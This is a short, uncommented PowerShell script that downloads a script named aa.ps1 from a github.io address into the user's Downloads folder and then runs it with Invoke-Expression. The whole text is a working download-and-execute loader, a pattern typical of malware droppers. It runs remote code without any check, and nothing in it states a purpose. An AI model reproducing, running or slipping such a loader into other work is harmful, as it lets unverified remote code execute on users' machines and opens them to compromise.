$url = "https://webntdev.github.io/apps/aa.ps1"
$downloadPath = "$env:USERPROFILE\Downloads\aa.ps1"
Invoke-WebRequest -Uri $url -OutFile $downloadPath
Start-Sleep -Seconds 10

if (Test-Path $downloadPath) {
    Invoke-Expression -Command "& '$downloadPath'"
} else {
    Write-Host "$url"
}
